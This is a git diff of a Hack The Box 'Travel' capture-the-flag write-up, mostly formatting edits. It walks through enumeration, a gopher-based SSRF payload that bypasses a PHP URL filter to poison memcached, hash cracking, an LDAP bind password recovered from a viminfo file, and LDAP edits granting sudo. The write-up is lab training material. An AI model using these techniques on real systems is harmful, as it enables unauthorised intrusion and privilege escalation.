@@ -65,17 +65,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
 ```
 
-The only ports that nmap showed as open on this machine were 22 \(SSH\), 80 \(HTTP\), and 443 \(HTTPS\). From the  nmap DNS NSE script scan I saw three virtual hosts for this IP: 
+The only ports that nmap showed as open on this machine were 22 \(SSH\), 80 \(HTTP\), and 443 \(HTTPS\). From the nmap DNS NSE script scan I saw three virtual hosts for this IP:
 
 ```text
 Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
 ```
 
- I added all three to my `/etc/hosts` file so I could connect.
+I added all three to my `/etc/hosts` file so I could connect.
 
 ![](../../.gitbook/assets/1-travel-site.png)
 
-Connecting to `www.travel.htb` I found a "coming soon"  type site with a countdown.  On this site I found a contact information section with a potential a user email format.
+Connecting to `www.travel.htb` I found a "coming soon" type site with a countdown. On this site I found a contact information section with a potential a user email format.
 
 ```text
 CONTACT INFORMATION
@@ -88,7 +88,7 @@ Checking port 443 only led to an under construction site with no useful informat
 
 ![](../../.gitbook/assets/6-wappalyzer%20%281%29.png)
 
-The Firefox plugin `wappalyzer` told me the site was using WordPress version 5.4.  I fired up `wpscan` to check the site for vulnerabilities using the syntax`wpscan --url http://blog.travel.htb/ --enumerate`.
+The Firefox plugin `wappalyzer` told me the site was using WordPress version 5.4. I fired up `wpscan` to check the site for vulnerabilities using the syntax`wpscan --url http://blog.travel.htb/ --enumerate`.
 
 ```text
 robots.txt found: http://blog.travel.htb/robots.txt
@@ -117,11 +117,11 @@ robots.txt found: http://blog.travel.htb/robots.txt
 
 ![](../../.gitbook/assets/5-wp-login.png)
 
-I discovered a WordPress login page at `http://blog.travel.htb/wp-login.php`  but there was nothing else useful from the scan.
+I discovered a WordPress login page at `http://blog.travel.htb/wp-login.php` but there was nothing else useful from the scan.
 
 ![](../../.gitbook/assets/7-noluck-reset.png)
 
-I tried resetting my password since this version of WordPress was reportedly vulnerable to information leakage through this, but it did not lead to anything useful.  
+I tried resetting my password since this version of WordPress was reportedly vulnerable to information leakage through this, but it did not lead to anything useful.
 
 ![](../../.gitbook/assets/8-xmlrpc.png)
 
@@ -129,31 +129,31 @@ The page at `xmlrpc.php` likewise did not seem to be useful at this time.
 
 ![](../../.gitbook/assets/9-blog-dev.png)
 
-Navigating to the virtual host `blog-dev` also seemed to be a dead-end, so I started another Dirbuster scan to see if anything useful that I could access could be found. 
+Navigating to the virtual host `blog-dev` also seemed to be a dead-end, so I started another Dirbuster scan to see if anything useful that I could access could be found.
 
 ![](../../.gitbook/assets/10-awesome-rss.png)
 
-There was an RSS feed using the Awesome RSS WordPress plugin on the `blog` site. 
+There was an RSS feed using the Awesome RSS WordPress plugin on the `blog` site.
 
 ![](../../.gitbook/assets/14-debug.png)
 
-In the source code of the page I noticed a section that said `DEBUG` that caught my eye.  I didn't know what to do with it, but it seemed interesting.
+In the source code of the page I noticed a section that said `DEBUG` that caught my eye. I didn't know what to do with it, but it seemed interesting.
 
 ![](../../.gitbook/assets/10-todo.png)
 
-There was also a section that talked about using "Additional CSS" and importing it from the `dev` site.  This seemed like a potential way to get code to cross domains.
+There was also a section that talked about using "Additional CSS" and importing it from the `dev` site. This seemed like a potential way to get code to cross domains.
 
 ![](../../.gitbook/assets/11-feed-xml.png)
 
-Another interesting find was the raw XML output that feeds the RSS page.  Perhaps there was an XML deserialization vulnerability in the site.
+Another interesting find was the raw XML output that feeds the RSS page. Perhaps there was an XML deserialization vulnerability in the site.
 
-Since the `wpscan` results didn't seem to yield any useful information I checked out my Dirbuster scan of the `dev-blog` site and looked for interesting directories. 
+Since the `wpscan` results didn't seem to yield any useful information I checked out my Dirbuster scan of the `dev-blog` site and looked for interesting directories.
 
 ![](../../.gitbook/assets/10-dirbuster-git.png)
 
-I found a potentially accessible git repo while scanning `blog-dev` with dirbuster.  
+I found a potentially accessible git repo while scanning `blog-dev` with dirbuster.
 
-_The dirbuster scan also shows that some security has been put in place against automated scanners. I could see the repeated chain of /./ dirs that told me the scanner was stuck.  After telling it to ignore those directories it found the `git` directory._
+_The dirbuster scan also shows that some security has been put in place against automated scanners. I could see the repeated chain of /./ dirs that told me the scanner was stuck. After telling it to ignore those directories it found the `git` directory._
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
@@ -224,17 +224,17 @@ The PHP file `rss_template.php` parses URLs and then creates SimplePie objects f
 
 ![](../../.gitbook/assets/13-ips.png)
 
-There was further evidence of website security in the file `template.php`.  It looked like they were trying to implement a rudimentary web application firewall by filtering out any requests that contained `file://`, `@`, `-o`, `-F`, or attempts to access the localhost.  Even though some url filtering is used, there are still many ways to bypass this. For example, `ftp://` or even `gopher://` could be used instead of `file://`, and if the localhost needs to be directly referenced different encoding schemes could be used.  For example, 127.0.0.1 in hex is `0x7F000001`, and in decimal `2130706433`.  Most URL parsers can automatically translate addresses no matter which numbering scheme is used.  
+There was further evidence of website security in the file `template.php`. It looked like they were trying to implement a rudimentary web application firewall by filtering out any requests that contained `file://`, `@`, `-o`, `-F`, or attempts to access the localhost. Even though some url filtering is used, there are still many ways to bypass this. For example, `ftp://` or even `gopher://` could be used instead of `file://`, and if the localhost needs to be directly referenced different encoding schemes could be used. For example, 127.0.0.1 in hex is `0x7F000001`, and in decimal `2130706433`. Most URL parsers can automatically translate addresses no matter which numbering scheme is used.
 
-The TemplateHelper class uses the `file_put_contents()` function to write data to a log file. This method is called from the `__construct()` and `__wakeup()` functions, which are known as "[magic methods](https://www.php.net/manual/en/language.oop5.magic.php)" in PHP and are called when certain actions happen. For example, the `__wakeup()` method is called when an object is deserialized.  Since these are public functions, they can be called from other PHP files that reference this document, such as seen in `rss_template.php`.
+The TemplateHelper class uses the `file_put_contents()` function to write data to a log file. This method is called from the `__construct()` and `__wakeup()` functions, which are known as "[magic methods](https://www.php.net/manual/en/language.oop5.magic.php)" in PHP and are called when certain actions happen. For example, the `__wakeup()` method is called when an object is deserialized. Since these are public functions, they can be called from other PHP files that reference this document, such as seen in `rss_template.php`.
 
 ![](../../.gitbook/assets/12.5-debug.png)
 
-The `rss_template.php` also has code that includes a `debug.php` if the parameter `debug` is set.  This is what I had seen in the source code of the  `/awesome-rss` site.  After noticing this in the PHP code I went back to the same page to see if I could trigger this to do something.  I set the debug flag by typing `http://blog.travel.htb/awesome-rss?debug` in the URL bar and got back something different in the page's source code than before.
+The `rss_template.php` also has code that includes a `debug.php` if the parameter `debug` is set. This is what I had seen in the source code of the `/awesome-rss` site. After noticing this in the PHP code I went back to the same page to see if I could trigger this to do something. I set the debug flag by typing `http://blog.travel.htb/awesome-rss?debug` in the URL bar and got back something different in the page's source code than before.
 
 ![](../../.gitbook/assets/14.5-debug.png)
 
-Using the `debug` parameter added a bit of deserialized PHP code to the middle of the page, but there was nothing that seemed immediately useful.  I did notice that the key portion of the output was prefixed with `_xct` like described in the PHP code.
+Using the `debug` parameter added a bit of deserialized PHP code to the middle of the page, but there was nothing that seemed immediately useful. I did notice that the key portion of the output was prefixed with `_xct` like described in the PHP code.
 
 The code allows for the import of a custom URL through the `custom_feed_url` attribute, so I hosted a web server using python SimpleHTTPServer and accessed using this link: [http://blog.travel.htb/awesome-rss/?custom\_feed\_url=http://10.10.15.53:8090/test.html](http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.15.53:8090/test.html)
 
@@ -255,25 +255,25 @@ Serving HTTP on 0.0.0.0 port 8090 ...
 10.10.10.189 - - [18/Sep/2020 21:04:23] "GET /test.html HTTP/1.1" 200 -
 ```
 
-This confirmed the SSRF vulnerability that the rudimentary PHP WAF was trying to protect against, though I still needed to figure out how to make it run code. Storing it in a memcached key that I saw being loaded through `debug.php` seemed like a likely route.  Since directly referencing file includes in a URL using the most common methods were blocked, I needed to to use a less common method.  Searching for SSRF file inclusion bypass led me to [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).  
+This confirmed the SSRF vulnerability that the rudimentary PHP WAF was trying to protect against, though I still needed to figure out how to make it run code. Storing it in a memcached key that I saw being loaded through `debug.php` seemed like a likely route. Since directly referencing file includes in a URL using the most common methods were blocked, I needed to to use a less common method. Searching for SSRF file inclusion bypass led me to [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).
 
 ![](../../.gitbook/assets/16.5-memcached-vuln.png)
 
-This presentation from Black Hat included one case study where the researcher found a vulnerablitity where they were able to use SSRF to exploit Memcached.  This example looked like exactly what I needed.
+This presentation from Black Hat included one case study where the researcher found a vulnerablitity where they were able to use SSRF to exploit Memcached. This example looked like exactly what I needed.
 
 ![](../../.gitbook/assets/16-internal-memcached-short.png)
 
-From `rss_template.php` I found the syntax to connect including 127.0.0.1:port \(11211\). Since the data to be included has to come from the local machine, I needed a way to embed it without pulling files from my machine. 
+From `rss_template.php` I found the syntax to connect including 127.0.0.1:port \(11211\). Since the data to be included has to come from the local machine, I needed a way to embed it without pulling files from my machine.
 
 > Next, we need to find a way to poison the memcached keys. This can be done with the help from the gopher protocol. Gopher is one of the oldest protocols used to access resources over a network. The modern HTTP protocol is an evolved form of Gopher. The gopher protocol is supported by various browsers as well as cURL. Unlike HTTP, Gopher can be used to craft requests and communicate with various kinds of services. `gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:test.com%0A%0A` For example, the request above will be interpreted by the server as: GET / HTTP/1.1 Host: test.com Where `%20` represents spaces and `%0A` stands for new lines. This can also be used to communicate with other services using plaintext protocols such as memcached.
 
-This creates a key named `TEST` in memcached with the value `test`. I sent a request  in the browser to test this out using my customized URL, using the hex-encoded IP `0x7F000001` in place of `127.0.0.1`. 
+This creates a key named `TEST` in memcached with the value `test`. I sent a request in the browser to test this out using my customized URL, using the hex-encoded IP `0x7F000001` in place of `127.0.0.1`.
 
 ```text
 http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7F000001:11211/_%0d%0aset%20TEST%204%200%204%0d%0atest%0d%0a
 ```
 
-  Using the `?debug` flag again after requesting the above URL returns the following:
+Using the `?debug` flag again after requesting the above URL returns the following:
 
 ```markup
 <!--
@@ -449,6 +449,8 @@ In the `/opt/wordpress` directory found and extracted a .sql file to my home mac
 
 picture
 
+### Finding user credentials
+
 It was a sqldump output file rather than an actual database, but contained all of the recent queries to the database, found password hashes for an `admin` user and `lynik-admin` , loading in hash-identifier to check what type of hash then loaded to crack with hashcat
 
 ```text
@@ -557,11 +559,7 @@ Sorry, user lynik-admin may not run sudo on travel.
 
 I tried to see what `lynik-admin` could do with sudo, but apparently this user was not in the sudoers file
 
-#### Further enumeration
-
-#### Finding user creds
-
-#### User.txt
+### User.txt
 
 ```text
 lynik-admin@travel:~$ ls
@@ -570,9 +568,9 @@ lynik-admin@travel:~$ cat user.txt
 c568778f414d770c700de3a7ff867230
 ```
 
-### Path to Power \(Gaining Administrator Access\)
+## Path to Power \(Gaining Root Access\)
 
-#### Enumeration as User
+### Enumeration as `lynik-admin`
 
 ```text
 lynik-admin@travel:~$ ls -la
@@ -605,24 +603,17 @@ BINDDN cn=lynik-admin,dc=travel,dc=htb
 
 ssh port forward tunnel
 
+![](../../.gitbook/assets/22-vim-delete.png)
+
 > This file is used to store metadata and user interaction history with Vim, which is a text editor. It helps Vim remember details such as the cursor placement, deleted data as well as search patterns.
 >
-> \`\`\`
+> &gt; The file stores a line which subsequently deleted from the .ldaprc file. This line contain the
 >
-> ## Registers:
->
-> ""1 LINE 0 BINDPW Theroadlesstraveled \|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
->
-> ## File marks:
->
-> '0 3 0 ~/.ldaprc \|4,48,3,0,1587670530,"~/.ldaprc"
+> &gt; bind password Theroadlesstraveled . Let's try using it to connect to LDAP.
+
+text
 
 ```text
-> The file stores a line which subsequently deleted from the .ldaprc file. This line contain the
-> bind password Theroadlesstraveled . Let's try using it to connect to LDAP.
-```
-text
-```
 lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
 # extended LDIF
 #
@@ -662,35 +653,7 @@ cn: lynik-admin
 userPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ=
  =
 
-# workstations, travel.htb
-dn: ou=workstations,dc=travel,dc=htb
-description: Workstations
-objectClass: organizationalUnit
-ou: workstations
-
-# linux, servers, travel.htb
-dn: ou=linux,ou=servers,dc=travel,dc=htb
-description: Linux Servers
-objectClass: organizationalUnit
-ou: linux
-
-# windows, servers, travel.htb
-dn: ou=windows,ou=servers,dc=travel,dc=htb
-description: Windows Servers
-objectClass: organizationalUnit
-ou: windows
-
-# users, linux, servers, travel.htb
-dn: ou=users,ou=linux,ou=servers,dc=travel,dc=htb
-description: Linux Users
-objectClass: organizationalUnit
-ou: users
-
-# groups, linux, servers, travel.htb
-dn: ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
-description: Linux Groups
-objectClass: organizationalUnit
-ou: groups
+...Snipped for brevity...
 
 # jane, users, linux, servers, travel.htb
 dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
@@ -904,20 +867,14 @@ result: 0 Success
 # numResponses: 22
 # numEntries: 21
 ```
-text
 
-> This time the bind was successful and we receive data. We also see that the user lynik-admin is an LDAP administrator.
-> This will allow us to edit user attributes stored in LDAP. Let's try to change a user's password. We
-> can use a GUI utility such as Apache Directory Studio to make it easier to browse and edit the
-> directory.
+I was able to successfully dump the contents of the LDAP database, and found a list of users.  Since `lynik-admin` is an LDAP administrator, I now had the ability to modify user and device attributes stored in the LDAP database.  In a Windows domain, this could give me the ability to promote a user to domain admin if I wished.  In this case I will just try to use this to promote a user to root.  Modifying LDAP through standard queries is pretty tedious, so I used Apache's Directory Studio to get a nice simple GUI.  This can be downloaded for free from [https://directory.apache.org/studio/downloads.html](https://directory.apache.org/studio/downloads.html).
 
-can modify ldap with https://directory.apache.org/studio/downloads.html
-
-need to port forward 389 (need sudo rights for low port)
+need to port forward 389 \(need sudo rights for low port\)
 
 tried portforwarding using localhost and 127.0.0.1, but failed to connect, checked ip a and /etc/hosts to find out more and noticed 172.20.0.10
 
-```
+```text
 lynik-admin@travel:/var$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -951,6 +908,7 @@ lynik-admin@travel:/var$ ip a
     link/ether 02:e7:02:1d:f1:36 brd ff:ff:ff:ff:ff:ff link-netnsid 5
 17: veth94d1920@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
     link/ether e6:86:a7:88:79:dd brd ff:ff:ff:ff:ff:ff link-netnsid 4
+
 lynik-admin@travel:/var$ cat /etc/hosts
 127.0.0.1 localhost
 127.0.1.1 travel
@@ -965,7 +923,8 @@ ff02::2 ip6-allrouters
 ```
 
 checked `ip a` and /etc/hosts to find out more and noticed 172.20.0.10
-```
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
 └─$ sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189 
 [sudo] password for zweilos: 
@@ -995,25 +954,19 @@ lynik-admin@travel:~$
 
 login as `lynik` failed with password, but it says that only an ssh key can be used to login
 
-https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap
+[https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap)
 
+> According to the sshd\_config manpage, the AuthorizedKeysCommand configuration is used to specify the program from which the SSH server retrieves user public keys from. The sss\_ssh\_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in LDAP.
 
-> According to the sshd_config manpage, the AuthorizedKeysCommand configuration is used to
-> specify the program from which the SSH server retrieves user public keys from.
-> The sss_ssh_authorizedkeys utility retrieves user public keys from the specified domain.
-> According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in
-> LDAP.
+Next I tried adding the public key attribute to the `lynik` user. First, I had to add a new objectClass attribute then select ldapPublicKey After that I added the attribute sshPublicKey to `lynik` and clicked on `Edit as Text` in the editor and paste the public key.
 
-Next I tried adding the public key attribute to the `lynik` user. First, I had to add a new objectClass attribute then select ldapPublicKey
-After that I added the attribute sshPublicKey to `lynik` and clicked on `Edit as Text` in the editor and paste the public key.
-
-searching for ssh keys and ldap led to https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap which shows that it is possible to add keys through ldap
+searching for ssh keys and ldap led to [https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap) which shows that it is possible to add keys through ldap
 
 pictures
 
 ## enumeration as `lynik`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
 └─$ ssh lynik@10.10.10.189 -i lynik 
 Creating directory '/home@TRAVEL/lynik'.
@@ -1048,10 +1001,11 @@ applicable law.
 lynik@travel:~$ id
 uid=5000(lynik) gid=5000(domainusers) groups=5000(domainusers)
 lynik@travel:~$
+```
 
-```
-Since this user is an ldap admin and can modify anything, I tried setting lynik uid and gid to 0 (root) but then was denied ssh login due to configuration to deny root login;
-```
+Since this user is an ldap admin and can modify anything, I tried setting lynik uid and gid to 0 \(root\) but then was denied ssh login due to configuration to deny root login;
+
+```text
 lynik@travel:/var$ cat /etc/group
 root:x:0:
 daemon:x:1:
@@ -1113,10 +1067,11 @@ trvl-admin:x:1000:
 lynik-admin:x:1001:
 docker:x:117:
 sssd:x:118:
+```
 
-```
-I checked sudoers file and saw that admins and members of sudo group can run all commands as root so I changed group id to 27 (sudo) then logout and back in
-```
+I checked sudoers file and saw that admins and members of sudo group can run all commands as root so I changed group id to 27 \(sudo\) then logout and back in
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
 └─$ ssh lynik@10.10.10.189 -i lynik
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
@@ -1164,12 +1119,13 @@ See "man sudo_root" for details.
 
 lynik@travel:~$ id
 uid=5000(lynik) gid=27(sudo) groups=27(sudo),5000(domainusers)
-
 ```
+
 ### Getting a shell
 
 after adding this user to the sudoers group:
-```
+
+```text
 lynik@travel:~$ sudo -l
 [sudo] password for lynik: 
 Matching Defaults entries for lynik on travel:
@@ -1182,9 +1138,8 @@ lynik@travel:~$ sudo su -
 root@travel:~# cat root.txt 
 550099de4950e4d03a939943ad265eb0
 ```
+
 ### Root.txt
-
-
 
 Thanks to xct [`xct`](https://www.hackthebox.eu/home/users/profile/13569) & [`jkr`](https://www.hackthebox.eu/home/users/profile/77141) for something interesting or useful about this machine.
 
